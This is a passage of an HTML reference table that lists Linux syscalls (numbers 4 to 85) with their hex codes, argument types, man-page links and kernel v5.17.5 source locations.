__user *filename</td><td>struct stat __user *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L406">fs&#x2F;stat.c:406</a></td></tr><tr><td>5</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newfstat.2.html">sys_newfstat</a></td><td>0x05</td><td>unsigned int fd</td><td>struct stat __user *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L444">fs&#x2F;stat.c:444</a></td></tr><tr><td>6</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newlstat.2.html">sys_newlstat</a></td><td>0x06</td><td>const char __user *filename</td><td>struct stat __user *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/stat.c#L417">fs&#x2F;stat.c:417</a></td></tr><tr><td>7</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html">sys_poll</a></td><td>0x07</td><td>struct pollfd __user *ufds</td><td>unsigned int nfds</td><td>int timeout</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L1068">fs&#x2F;select.c:1068</a></td></tr><tr><td>8</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lseek.2.html">sys_lseek</a></td><td>0x08</td><td>unsigned int fd</td><td>off_t offset</td><td>unsigned int whence</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L311">fs&#x2F;read_write.c:311</a></td></tr><tr><td>9</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mmap.2.html">sys_mmap</a></td><td>0x09</td><td>unsigned long addr</td><td>unsigned long len</td><td>int prot</td><td>int flags</td><td>int fd</td><td>long off</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/arch/arm64/kernel/sys.c#L21">arch&#x2F;arm64&#x2F;kernel&#x2F;sys.c:21</a></td></tr><tr><td>10</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mprotect.2.html">sys_mprotect</a></td><td>0x0a</td><td>unsigned long start</td><td>size_t len</td><td>unsigned long prot</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mprotect.c#L816">mm&#x2F;mprotect.c:816</a></td></tr><tr><td>11</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munmap.2.html">sys_munmap</a></td><td>0x0b</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mmap.c#L2797">mm&#x2F;mmap.c:2797</a></td></tr><tr><td>12</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/brk.2.html">sys_brk</a></td><td>0x0c</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mmap.c#L170">mm&#x2F;mmap.c:170</a></td></tr><tr><td>13</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html">sys_rt_sigaction</a></td><td>0x0d</td><td>int</td><td>const struct sigaction __user *</td><td>struct sigaction __user *</td><td>size_t</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L4410">kernel&#x2F;signal.c:4410</a></td></tr><tr><td>14</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigprocmask.2.html">sys_rt_sigprocmask</a></td><td>0x0e</td><td>int how</td><td>sigset_t __user *set</td><td>sigset_t __user *oset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3141">kernel&#x2F;signal.c:3141</a></td></tr><tr><td>15</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigreturn.2.html">sys_rt_sigreturn</a></td><td>0x0f</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>16</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioctl.2.html">sys_ioctl</a></td><td>0x10</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/ioctl.c#L856">fs&#x2F;ioctl.c:856</a></td></tr><tr><td>17</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html">sys_pread64</a></td><td>0x11</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L672">fs&#x2F;read_write.c:672</a></td></tr><tr><td>18</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwrite64.2.html">sys_pwrite64</a></td><td>0x12</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L706">fs&#x2F;read_write.c:706</a></td></tr><tr><td>19</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/readv.2.html">sys_readv</a></td><td>0x13</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1041">fs&#x2F;read_write.c:1041</a></td></tr><tr><td>20</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/writev.2.html">sys_writev</a></td><td>0x14</td><td>unsigned long fd</td><td>const struct iovec __user *vec</td><td>unsigned long vlen</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1047">fs&#x2F;read_write.c:1047</a></td></tr><tr><td>21</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/access.2.html">sys_access</a></td><td>0x15</td><td>const char __user *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L503">fs&#x2F;open.c:503</a></td></tr><tr><td>22</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pipe.2.html">sys_pipe</a></td><td>0x16</td><td>int __user *fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/pipe.c#L1031">fs&#x2F;pipe.c:1031</a></td></tr><tr><td>23</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/select.2.html">sys_select</a></td><td>0x17</td><td>int n</td><td>fd_set __user *inp</td><td>fd_set __user *outp</td><td>fd_set __user *exp</td><td>struct __kernel_old_timeval __user *tvp</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/select.c#L726">fs&#x2F;select.c:726</a></td></tr><tr><td>24</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_yield.2.html">sys_sched_yield</a></td><td>0x18</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>25</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mremap.2.html">sys_mremap</a></td><td>0x19</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mremap.c#L889">mm&#x2F;mremap.c:889</a></td></tr><tr><td>26</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msync.2.html">sys_msync</a></td><td>0x1a</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/msync.c#L32">mm&#x2F;msync.c:32</a></td></tr><tr><td>27</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mincore.2.html">sys_mincore</a></td><td>0x1b</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char __user * vec</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/mincore.c#L232">mm&#x2F;mincore.c:232</a></td></tr><tr><td>28</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/madvise.2.html">sys_madvise</a></td><td>0x1c</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/mm/madvise.c#L1440">mm&#x2F;madvise.c:1440</a></td></tr><tr><td>29</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmget.2.html">sys_shmget</a></td><td>0x1d</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L850">ipc&#x2F;shm.c:850</a></td></tr><tr><td>30</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmat.2.html">sys_shmat</a></td><td>0x1e</td><td>int shmid</td><td>char __user *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L1696">ipc&#x2F;shm.c:1696</a></td></tr><tr><td>31</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmctl.2.html">sys_shmctl</a></td><td>0x1f</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds __user *buf</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L1299">ipc&#x2F;shm.c:1299</a></td></tr><tr><td>32</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup.2.html">sys_dup</a></td><td>0x20</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/file.c#L1269">fs&#x2F;file.c:1269</a></td></tr><tr><td>33</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/dup2.2.html">sys_dup2</a></td><td>0x21</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/file.c#L1254">fs&#x2F;file.c:1254</a></td></tr><tr><td>34</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pause.2.html">sys_pause</a></td><td>0x22</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>35</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nanosleep.2.html">sys_nanosleep</a></td><td>0x23</td><td>struct __kernel_timespec __user *rqtp</td><td>struct __kernel_timespec __user *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/hrtimer.c#L2118">kernel&#x2F;time&#x2F;hrtimer.c:2118</a></td></tr><tr><td>36</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getitimer.2.html">sys_getitimer</a></td><td>0x24</td><td>int which</td><td>struct __kernel_old_itimerval __user *value</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/itimer.c#L113">kernel&#x2F;time&#x2F;itimer.c:113</a></td></tr><tr><td>37</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/alarm.2.html">sys_alarm</a></td><td>0x25</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/itimer.c#L306">kernel&#x2F;time&#x2F;itimer.c:306</a></td></tr><tr><td>38</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setitimer.2.html">sys_setitimer</a></td><td>0x26</td><td>int which</td><td>struct __kernel_old_itimerval __user *value</td><td>struct __kernel_old_itimerval __user *ovalue</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/time/itimer.c#L332">kernel&#x2F;time&#x2F;itimer.c:332</a></td></tr><tr><td>39</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpid.2.html">sys_getpid</a></td><td>0x27</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>40</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile64.2.html">sys_sendfile64</a></td><td>0x28</td><td>int out_fd</td><td>int in_fd</td><td>loff_t __user *offset</td><td>size_t count</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/read_write.c#L1309">fs&#x2F;read_write.c:1309</a></td></tr><tr><td>41</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socket.2.html">sys_socket</a></td><td>0x29</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1647">net&#x2F;socket.c:1647</a></td></tr><tr><td>42</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/connect.2.html">sys_connect</a></td><td>0x2a</td><td>int</td><td>struct sockaddr __user *</td><td>int</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2000">net&#x2F;socket.c:2000</a></td></tr><tr><td>43</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/accept.2.html">sys_accept</a></td><td>0x2b</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1941">net&#x2F;socket.c:1941</a></td></tr><tr><td>44</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendto.2.html">sys_sendto</a></td><td>0x2c</td><td>int</td><td>void __user *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr __user *</td><td>int</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2125">net&#x2F;socket.c:2125</a></td></tr><tr><td>45</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvfrom.2.html">sys_recvfrom</a></td><td>0x2d</td><td>int</td><td>void __user *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr __user *</td><td>int __user *</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2183">net&#x2F;socket.c:2183</a></td></tr><tr><td>46</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendmsg.2.html">sys_sendmsg</a></td><td>0x2e</td><td>int fd</td><td>struct user_msghdr __user *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2572">net&#x2F;socket.c:2572</a></td></tr><tr><td>47</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/recvmsg.2.html">sys_recvmsg</a></td><td>0x2f</td><td>int fd</td><td>struct user_msghdr __user *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2780">net&#x2F;socket.c:2780</a></td></tr><tr><td>48</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shutdown.2.html">sys_shutdown</a></td><td>0x30</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2342">net&#x2F;socket.c:2342</a></td></tr><tr><td>49</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/bind.2.html">sys_bind</a></td><td>0x31</td><td>int</td><td>struct sockaddr __user *</td><td>int</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1785">net&#x2F;socket.c:1785</a></td></tr><tr><td>50</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/listen.2.html">sys_listen</a></td><td>0x32</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1817">net&#x2F;socket.c:1817</a></td></tr><tr><td>51</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsockname.2.html">sys_getsockname</a></td><td>0x33</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2038">net&#x2F;socket.c:2038</a></td></tr><tr><td>52</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getpeername.2.html">sys_getpeername</a></td><td>0x34</td><td>int</td><td>struct sockaddr __user *</td><td>int __user *</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2074">net&#x2F;socket.c:2074</a></td></tr><tr><td>53</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/socketpair.2.html">sys_socketpair</a></td><td>0x35</td><td>int</td><td>int</td><td>int</td><td>int __user *</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L1748">net&#x2F;socket.c:1748</a></td></tr><tr><td>54</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setsockopt.2.html">sys_setsockopt</a></td><td>0x36</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2260">net&#x2F;socket.c:2260</a></td></tr><tr><td>55</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getsockopt.2.html">sys_getsockopt</a></td><td>0x37</td><td>int fd</td><td>int level</td><td>int optname</td><td>char __user *optval</td><td>int __user *optlen</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/net/socket.c#L2308">net&#x2F;socket.c:2308</a></td></tr><tr><td>56</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clone.2.html">sys_clone</a></td><td>0x38</td><td>unsigned long</td><td>unsigned long</td><td>int __user *</td><td>unsigned long</td><td>int __user *</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/fork.c#L2785">kernel&#x2F;fork.c:2785</a></td></tr><tr><td>57</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fork.2.html">sys_fork</a></td><td>0x39</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>58</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vfork.2.html">sys_vfork</a></td><td>0x3a</td><td>void</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="https://elixir.bootlin.com/linux/v5.17.5/source/not">https://elixir.bootlin.com/linux/v5.17.5/source/not</a> found#L)</td></tr><tr><td>59</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/execve.2.html">sys_execve</a></td><td>0x3b</td><td>const char __user *filename</td><td>const char __user *const __user *argv</td><td>const char __user *const __user *envp</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/exec.c#L2087">fs&#x2F;exec.c:2087</a></td></tr><tr><td>60</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit.2.html">sys_exit</a></td><td>0x3c</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L915">kernel&#x2F;exit.c:915</a></td></tr><tr><td>61</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/wait4.2.html">sys_wait4</a></td><td>0x3d</td><td>pid_t pid</td><td>int __user *stat_addr</td><td>int options</td><td>struct rusage __user *ru</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/exit.c#L1730">kernel&#x2F;exit.c:1730</a></td></tr><tr><td>62</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html">sys_kill</a></td><td>0x3e</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/signal.c#L3771">kernel&#x2F;signal.c:3771</a></td></tr><tr><td>63</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/newuname.2.html">sys_newuname</a></td><td>0x3f</td><td>struct new_utsname __user *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/kernel/sys.c#L1288">kernel&#x2F;sys.c:1288</a></td></tr><tr><td>64</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semget.2.html">sys_semget</a></td><td>0x40</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L624">ipc&#x2F;sem.c:624</a></td></tr><tr><td>65</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semop.2.html">sys_semop</a></td><td>0x41</td><td>int semid</td><td>struct sembuf __user *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L2298">ipc&#x2F;sem.c:2298</a></td></tr><tr><td>66</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/semctl.2.html">sys_semctl</a></td><td>0x42</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/sem.c#L1705">ipc&#x2F;sem.c:1705</a></td></tr><tr><td>67</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/shmdt.2.html">sys_shmdt</a></td><td>0x43</td><td>char __user *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/shm.c#L1837">ipc&#x2F;shm.c:1837</a></td></tr><tr><td>68</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgget.2.html">sys_msgget</a></td><td>0x44</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L315">ipc&#x2F;msg.c:315</a></td></tr><tr><td>69</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgsnd.2.html">sys_msgsnd</a></td><td>0x45</td><td>int msqid</td><td>struct msgbuf __user *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L971">ipc&#x2F;msg.c:971</a></td></tr><tr><td>70</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgrcv.2.html">sys_msgrcv</a></td><td>0x46</td><td>int msqid</td><td>struct msgbuf __user *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L1270">ipc&#x2F;msg.c:1270</a></td></tr><tr><td>71</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/msgctl.2.html">sys_msgctl</a></td><td>0x47</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds __user *buf</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/ipc/msg.c#L640">ipc&#x2F;msg.c:640</a></td></tr><tr><td>72</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fcntl.2.html">sys_fcntl</a></td><td>0x48</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/fcntl.c#L439">fs&#x2F;fcntl.c:439</a></td></tr><tr><td>73</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/flock.2.html">sys_flock</a></td><td>0x49</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/locks.c#L2084">fs&#x2F;locks.c:2084</a></td></tr><tr><td>74</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fsync.2.html">sys_fsync</a></td><td>0x4a</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L218">fs&#x2F;sync.c:218</a></td></tr><tr><td>75</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fdatasync.2.html">sys_fdatasync</a></td><td>0x4b</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/sync.c#L223">fs&#x2F;sync.c:223</a></td></tr><tr><td>76</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate.2.html">sys_truncate</a></td><td>0x4c</td><td>const char __user *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L144">fs&#x2F;open.c:144</a></td></tr><tr><td>77</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate.2.html">sys_ftruncate</a></td><td>0x4d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L202">fs&#x2F;open.c:202</a></td></tr><tr><td>78</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents.2.html">sys_getdents</a></td><td>0x4e</td><td>unsigned int fd</td><td>struct linux_dirent __user *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/readdir.c#L271">fs&#x2F;readdir.c:271</a></td></tr><tr><td>79</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcwd.2.html">sys_getcwd</a></td><td>0x4f</td><td>char __user *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/d_path.c#L411">fs&#x2F;d_path.c:411</a></td></tr><tr><td>80</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chdir.2.html">sys_chdir</a></td><td>0x50</td><td>const char __user *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L508">fs&#x2F;open.c:508</a></td></tr><tr><td>81</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchdir.2.html">sys_fchdir</a></td><td>0x51</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/open.c#L534">fs&#x2F;open.c:534</a></td></tr><tr><td>82</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rename.2.html">sys_rename</a></td><td>0x52</td><td>const char __user *oldname</td><td>const char __user *newname</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4974">fs&#x2F;namei.c:4974</a></td></tr><tr><td>83</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdir.2.html">sys_mkdir</a></td><td>0x53</td><td>const char __user *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4079">fs&#x2F;namei.c:4079</a></td></tr><tr><td>84</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rmdir.2.html">sys_rmdir</a></td><td>0x54</td><td>const char __user *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="https://elixir.bootlin.com/linux/v5.17.5/source/fs/namei.c#L4199">fs&#x2F;namei.c:4199</a></td></tr><tr><td>85</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/creat.2.html">sys_creat</a></td><td>0x55</td><td>const char __user *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a 